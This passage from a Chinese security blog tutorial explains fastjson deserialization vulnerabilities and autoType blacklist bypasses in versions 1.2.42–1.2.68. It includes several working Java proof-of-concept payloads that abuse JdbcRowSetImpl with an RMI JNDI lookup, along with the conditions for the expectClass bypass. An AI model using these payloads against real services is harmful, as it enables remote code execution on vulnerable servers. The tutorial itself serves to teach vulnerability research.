<p>然后<code>checkAutoType</code>这里进行判断，仅仅是把原来的<code>L</code>和<code>;</code>换成了<code>hash</code>的形式：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680757094959-6756ef54-ab53-482a-a0af-6a0de63a56f2.png#averageHue=%23f8f6f5&clientId=u8272b843-0f56-4&from=paste&height=815&id=u4ffb3c96&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=212881&status=done&style=none&taskId=u423c075a-9ca0-4619-a344-57be7c09850&title=&width=1536" alt="image.png"><br>所以直接双写<code>L</code>和<code>;</code>即可：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ldap 和 rmi都可以</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680758733441-7a33dde7-2108-41f2-96fd-d455192eb9e4.png#averageHue=%23f7f6f3&clientId=u8272b843-0f56-4&from=paste&height=818&id=u6e9e41e8&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=248021&status=done&style=none&taskId=uea7fa118-d959-4194-a205-0006a867a32&title=&width=1536" alt="image.png"></p>
<h2 id="4-fastjson-1-2-43-反序列化漏洞"><a href="#4-fastjson-1-2-43-反序列化漏洞" class="headerlink" title="4. fastjson 1.2.43 反序列化漏洞"></a>4. fastjson 1.2.43 反序列化漏洞</h2><p>修改之前的<code>pom.xml</code>里面的版本为<code>1.2.43</code>。<br>直接全局搜索<code>checkAutoType</code>，看修改后的代码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680775071552-c2abd2dd-0736-474b-85d5-3d2a0a0f9b3a.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=821&id=u90dbfc03&name=image.png&originHeight=1026&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=195448&status=done&style=none&taskId=ue63da61b-63e3-4de7-b39a-001dcf1df2f&title=&width=1536" alt="image.png"><br>意思就是说如果出现连续的两个<code>L</code>，就报错。那么问题来了，你也妹对<code>[</code>进行限制啊，直接绕：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ldap 和 rmi都可以</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680775167890-7f3f5a07-ae61-44a4-af1e-b73c914599fd.png#averageHue=%23f7f6f5&clientId=u8272b843-0f56-4&from=paste&height=817&id=uc32870ec&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=243628&status=done&style=none&taskId=u84547233-48f3-4771-b061-5712bbd8ebd&title=&width=1536" alt="image.png"></p>
<h2 id="5-fastjson-1-2-44-mappings缓存导致反序列化漏洞"><a href="#5-fastjson-1-2-44-mappings缓存导致反序列化漏洞" class="headerlink" title="5. fastjson 1.2.44 mappings缓存导致反序列化漏洞"></a>5. fastjson 1.2.44 mappings缓存导致反序列化漏洞</h2><p>修改之前的<code>pom.xml</code>里面的版本为<code>1.2.44</code>。<br>这个版本的<code>fastjson</code>总算是修复了之前的关于字符串处理绕过黑名单的问题，但是存在之前完美在说<code>fastjson 1.2.25</code>版本的第一种<code>poc</code>的那个通过<code>mappings</code>缓存绕过<code>checkAutoType</code>的漏洞，复现如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ldap 和 rmi都可以</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680775848153-f5c889aa-82e3-46c6-8875-c6878f5a82f8.png#averageHue=%23f7f6f4&clientId=u8272b843-0f56-4&from=paste&height=818&id=udaf4f9c4&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=249270&status=done&style=none&taskId=uc6ecfd51-68b4-4370-b13f-2b095333222&title=&width=1536" alt="image.png"></p>
<h2 id="6-fastjson-1-2-47-mappings缓存导致反序列化漏洞"><a href="#6-fastjson-1-2-47-mappings缓存导致反序列化漏洞" class="headerlink" title="6. fastjson 1.2.47 mappings缓存导致反序列化漏洞"></a>6. fastjson 1.2.47 mappings缓存导致反序列化漏洞</h2><p>原理同上，<code>payload</code>也同上。复现截图：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680776133861-28037cfe-bb18-4e8a-aaed-7fd1a3e369c6.png#averageHue=%23f7f5f4&clientId=u8272b843-0f56-4&from=paste&height=823&id=ufe14d765&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=256787&status=done&style=none&taskId=u68381a4c-f989-48ee-a8e6-76381ebe60a&title=&width=1536" alt="image.png"></p>
<h2 id="7-fastjson-1-2-68-反序列化漏洞"><a href="#7-fastjson-1-2-68-反序列化漏洞" class="headerlink" title="7.fastjson 1.2.68 反序列化漏洞"></a>7.fastjson 1.2.68 反序列化漏洞</h2><p><code>fastjson 1.2.47</code>的时候爆出来的这个缓存的漏洞很严重，官方在<code>1.2.48</code>的时候就进行了限制。<br>我们修改上面的<code>pom.xml</code>中<code>fastjson</code>版本为<code>1.2.68</code>。<br>直接翻到<code>MiscCodec</code>这里，可以发现，<code>cache</code>这里默认设置成了<code>false</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680776973783-8ce28666-41b1-46a1-ab62-b6c333f45a0e.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=818&id=uf1c38de7&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=197671&status=done&style=none&taskId=ud425afd5-487e-427c-9d03-37023aa8493&title=&width=1536" alt="image.png"><br>并且<code>loadClass</code>重载方法的默认的调用改为不缓存：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680777248813-c8b4212a-a968-4c46-a287-ab631daede97.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=815&id=uaa9155ef&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=213950&status=done&style=none&taskId=u0f0208c4-7a7f-4868-805d-c0fb6a5048f&title=&width=1536" alt="image.png"><br><code>fastjson 1.2.68</code>的一个亮点就是更新了个<code>safeMode</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680777390863-4080f6fa-2c82-4f4d-abf6-5262756df1bb.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=818&id=u9caf80c7&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=213569&status=done&style=none&taskId=uf347b2b9-9fdf-4fd7-8104-d2bfe099d43&title=&width=1536" alt="image.png"><br>如果开启了<code>safeMode</code>，那么<code>autoType</code>就会被完全禁止。<br>但是，这个版本有了个新的绕过方式：<code>expectClass</code>。<br>仔细看<code>checkAutoType</code>函数：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680778956318-ac9ae2f8-b2c7-4ce1-9765-f13a975ec8ba.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=u0ebc4421&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=207624&status=done&style=none&taskId=u51ffae09-4478-4349-9cfa-30dea94e458&title=&width=1536" alt="image.png"></p>
<blockquote>
<p>以下条件的整理参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122315526">https://blog.csdn.net/mole_exp&#x2F;article&#x2F;details&#x2F;122315526</a></p>
</blockquote>
<p>发现同时满足以下条件的时候，可以绕过<code>checkAutoType</code>：</p>
<ul>
<li><code>expectClass</code>不为<code>null</code>，且不等于<code>Object.class</code>、<code>Serializable.class</code>、<code>Cloneable.class</code>、<code>Closeable.class</code>、<code>EventListener.class</code>、<code>Iterable.class</code>、<code>Collection.class</code>；</li>
<li><code>expectClass</code>需要在缓存集合<code>TypeUtils#mappings</code>中；</li>
<li><code>expectClass</code>和<code>typeName</code>都不在黑名单中；</li>
<li><code>typeName</code>不是<code>ClassLoader</code>、<code>DataSource</code>、<code>RowSet</code>的子类；</li>
<li><code>typeName</code>是<code>expectClass</code>的子类。</li>
</ul>
<p>这个<code>expectClass</code>并不是什么陌生的新名词，我们在前置知识里面的<code>demo</code>中的这个<code>Person.class</code>就是期望类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> JSON.parseObject(jsonString2, Person.class);</span><br></pre></td></tr></table></figure>
<p>但是之前的那些<code>payload</code>执行的时候，期望类这里都是<code>null</code>，那么是哪些地方调用了呢？我们直接全局搜索<code>parser.getConfig().checkAutoType</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680779902751-3dbcc23e-48e6-44be-b9cf-b2dc06fe1aa0.png#averageHue=%23f7efe9&clientId=u8272b843-0f56-4&from=paste&height=510&id=ue9a11536&name=image.png&originHeight=637&originWidth=729&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52288&status=done&style=none&taskId=ub780def9-05b0-4ad6-b030-65effb37901&title=&width=583.2" alt="image.png"><br>一个是<code>JavaBeanDeserializer</code>的<code>deserialze</code>这里：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680779685303-8744e9a5-f783-41c1-8c82-25f52f511814.png#averageHue=%23f9f6f5&clientId=u8272b843-0f56-4&from=paste&height=816&id=u2ad5c90a&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=236850&status=done&style=none&taskId=u1f53ea35-31b4-46a9-a19b-963e88f00c4&title=&width=1536" alt="image.png"><br>另一个是<code>ThrowableDeserializer</code>的<code>deserialze</code>这里：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680779966075-84e49d32-ad2c-40fa-9567-a080307c37c9.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=ued608110&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=224876&status=done&style=none&taskId=uff4d739d-577e-4572-805d-944bb078745&title=&width=1536" alt="image.png">具体的分析可以看<code>tr1ple</code>师傅的文章，写的实在是太详细了：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/13489260.html">https://www.cnblogs.com/tr1ple/p/13489260.html</a></p>
</blockquote>
<h1 id="四、参考与致谢"><a href="#四、参考与致谢" class="headerlink" title="四、参考与致谢"></a>四、参考与致谢</h1><p>我在学习<code>fastjson</code>漏洞的时候，阅读参考了以下文章，每篇文章都或多或少地给予了我帮助与启发，于是在此一并列出！也十分感谢<code>4ra1n</code>师傅和<code>su18</code>师傅热情地回答我一个<code>Java</code>初学者提出的可能有点傻的问题。（笑）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.anquanke.com/post/id/248892</span></span><br><span class="line">https:<span class="comment">//paper.seebug.org/1698/</span></span><br><span class="line">https:<span class="comment">//www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/</span></span><br><span class="line">https:<span class="comment">//www.rc.sb/fastjson/</span></span><br><span class="line">https:<span class="comment">//drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl利用链/</span></span><br><span class="line">https:<span class="comment">//blog.weik1.top/2021/09/08/Fastjson 反序列化历史漏洞分析/</span></span><br><span class="line">http:<span class="comment">//blog.topsec.com.cn/fastjson-1-2-24反序列化漏洞深度分析/</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7107</span></span><br><span class="line">https:<span class="comment">//www.javasec.org/java-vuls/FastJson.html</span></span><br><span class="line">https:<span class="comment">//www.freebuf.com/articles/web/265904.html</span></span><br><span class="line">https:<span class="comment">//b1ue.cn/archives/506.html</span></span><br><span class="line">http:<span class="comment">//xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/</span></span><br><span class="line">https:<span class="comment">//forum.butian.net/share/1092</span></span><br><span class="line">https:<span class="comment">//www.freebuf.com/vuls/178012.html</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/nice0e3/p/14776043.html</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/nice0e3/p/14601670.html</span></span><br><span class="line">http:<span class="comment">//140.143.242.46/blog/024.html</span></span><br><span class="line">https:<span class="comment">//paper.seebug.org/994/</span></span><br><span class="line">https:<span class="comment">//paper.seebug.org/1192/</span></span><br><span class="line">http:<span class="comment">//xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/</span></span><br><span class="line">https:<span class="comment">//zhuanlan.zhihu.com/p/544463507</span></span><br><span class="line">https:<span class="comment">//jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/</span></span><br><span class="line">https:<span class="comment">//www.anquanke.com/post/id/240446</span></span><br><span class="line">https:<span class="comment">//yaklang.io/products/article/yakit-technical-study/fast-Json/</span></span><br><span class="line">https:<span class="comment">//su18.org/post/fastjson/#2-fastjson-1225</span></span><br><span class="line">https:<span class="comment">//cloud.tencent.com/developer/article/1957185</span></span><br><span class="line">https:<span class="comment">//yaklang.io/products/article/yakit-technical-study/fast-Json</span></span><br><span class="line">https:<span class="comment">//developer.aliyun.com/article/842073</span></span><br><span class="line">http:<span class="comment">//wjlshare.com/archives/1526</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/9052#toc-16</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/Adminxe/article/details/105918000</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/q20010619/article/details/123155767</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7027#toc-3</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7027#toc-5</span></span><br><span class="line">https:<span class="comment">//www.sec-in.com/article/950</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7027#toc-14</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/nice0e3/p/14776043.html#1225-1241-绕过</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/nice0e3/p/14776043.html#1225版本修复</span></span><br><span class="line">https:<span class="comment">//y4er.com/posts/fastjson-1.2.80/#回顾fastjson历史漏洞</span></span><br><span class="line">https:<span class="comment">//github.com/su18/hack-fastjson-1.2.80</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/mole_exp/article/details/122315526</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/ph4nt0mer/p/13065373.html</span></span><br><span class="line">https:<span class="comment">//alewong.github.io/2020/09/14/Fastjson-1-2-68版本反序列化漏洞分析篇/</span></span><br><span class="line">https:<span class="comment">//kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</span></span><br><span class="line">https:<span class="comment">//www.anquanke.com/post/id/225439</span></span><br></pre></td></tr></table></figure>
</div><div class="article-licensing box"><div class="licensing-title"><p>零基础学fastjson漏洞（基础篇）</p><p><a href="https://w01fh4cker.github.io/2024/12/30/LearnFastjsonVulnFromZero-Basic/">https://w01fh4cker.github.io/2024/12/30/LearnFastjsonVulnFromZero-Basic/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>W01fh4cker</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2024-12-30</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2024-12-30</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Java/">Java</a><a class="link-muted mr-2" rel="tag" href="/tags/Fastjson/">Fastjson</a></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>Afdian.net</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="/" alt="Alipay"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>Buy me a coffee</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="/" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2024/12/30/LearnJavaMemshellFromZero/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">完全零基础从0到1掌握Java内存马</span></a></div></nav><div class="card" id="comments"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.jpg" alt="W01fh4cker"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">W01fh4cker</p><p class="is-size-6 is-block">Doubt is the key to knowledge.</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Earth</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives/"><p class="title">2</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories/"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags/"><p class="title">3</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/W01fh4cker" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/W01fh4cker"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://x.com/W01fh4cker"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-12-30T06:04:53.000Z">2024-12-30</time></p><p class="title"><a href="/2024/12/30/LearnJavaMemshellFromZero/">完全零基础从0到1掌握Java内存马</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-12-30T06:04:53.000Z">2024-12-30</time></p><p class="title"><a href="/2024/12/30/LearnFastjsonVulnFromZero-Basic/">零基础学fastjson漏洞（基础篇）</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/12/"><span class="level-start"><span class="level-item">December 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Fastjson/"><span class="tag">Fastjson</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java/"><span class="tag">Java</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Memshell/"><span class="tag">Memshell</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#一、前置知识"><span class="level-left"><span class="level-item">1</span><span class="level-item">一、前置知识</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#1-fastjson怎么用？"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">1. fastjson怎么用？</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#（1）在IDEA中新建一个maven项目，并引入fastjson依赖"><span class="level-left"><span class="level-item">1.1.1</span><span class="level-item">（1）在IDEA中新建一个maven项目，并引入fastjson依赖</span></span></a></li><li><a class="level is-mobile" href="#（2）一个简单的demo"><span class="level-left"><span class="level-item">1.1.2</span><span class="level-item">（2）一个简单的demo</span></span></a></li><li><a class="level is-mobile" href="#（3）更进一步改动理解上述demo代码"><span class="level-left"><span class="level-item">1.1.3</span><span class="level-item">（3）更进一步改动理解上述demo代码</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#①问题1：Person-person2-JSON-parseObject-jsonString2-Person-class-这里为什么可以直接使用Person-class来进行映射？"><span class="level-left"><span class="level-item">1.1.3.1</span><span class="level-item">①问题1：Person person2 = JSON.parseObject(jsonString2, Person.class);这里为什么可以直接使用Person.class来进行映射？</span></span></a></li><li><a class="level is-mobile" href="#②问题2：为什么我初始化对象的时候，代码明明写的是Person-person-new-Person-Alice-18-，name在前，age在后，怎么转化成json字符串的时候就变成了age在前，name在后了？"><span class="level-left"><span class="level-item">1.1.3.2</span><span class="level-item">②问题2：为什么我初始化对象的时候，代码明明写的是Person person = new Person(&quot;Alice&quot;, 18);，name在前，age在后，怎么转化成json字符串的时候就变成了age在前，name在后了？</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#2-type是什么东西？如何反序列化带-type的json字符串？"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">2. @type是什么东西？如何反序列化带@type的json字符串？</span></span></a></li><li><a class="level is-mobile" href="#3-JNDI是什么东西？"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">3. JNDI是什么东西？</span></span></a><ul class="menu-list"><li><a class="level is-mobile" 